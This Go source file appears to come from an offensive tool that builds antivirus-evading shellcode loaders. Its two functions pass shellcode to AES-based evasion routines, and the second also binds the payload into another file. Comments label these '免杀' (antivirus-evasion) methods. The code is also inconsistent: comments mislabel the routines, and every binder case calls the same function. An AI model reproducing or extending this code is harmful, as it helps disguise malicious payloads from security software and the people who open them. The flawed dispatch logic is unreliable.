package service

func Bypass_way(bypass string, Shellcode string, fileName string) {
	switch bypass {
	case "AES1":
		// 免杀方式用AES1
		AES1(Shellcode, fileName)
		// c.HTML(200, "download.html", nil)
	case "AES2":
		// 免杀方式用AES2
		AES2(Shellcode, fileName)
	case "HouQing":
		// 免杀方式用JAVA_separate
		HouQing(Shellcode, fileName)
	case "AES_GO_separate":
		// 免杀方式用PYTHON_separate
		AES_GO_separate(Shellcode, fileName)
	}
}
func BinderBypass_way(bypass string, Shellcode string, fileName string, binderFilePath string, binderFileName string) {
	switch bypass {
	case "AES1":
		// 免杀方式用AES1
		BinderAES1(Shellcode, fileName, binderFilePath, binderFileName)
		// c.HTML(200, "download.html", nil)
	case "AES2":
		// 免杀方式用AES2
		BinderAES1(Shellcode, fileName, binderFilePath, binderFileName)
	case "HouQing":
		// 免杀方式用JAVA_separate
		BinderAES1(Shellcode, fileName, binderFilePath, binderFileName)
	case "AES_GO_separate":
		// 免杀方式用PYTHON_separate
		BinderAES1(Shellcode, fileName, binderFilePath, binderFileName)
	}
}
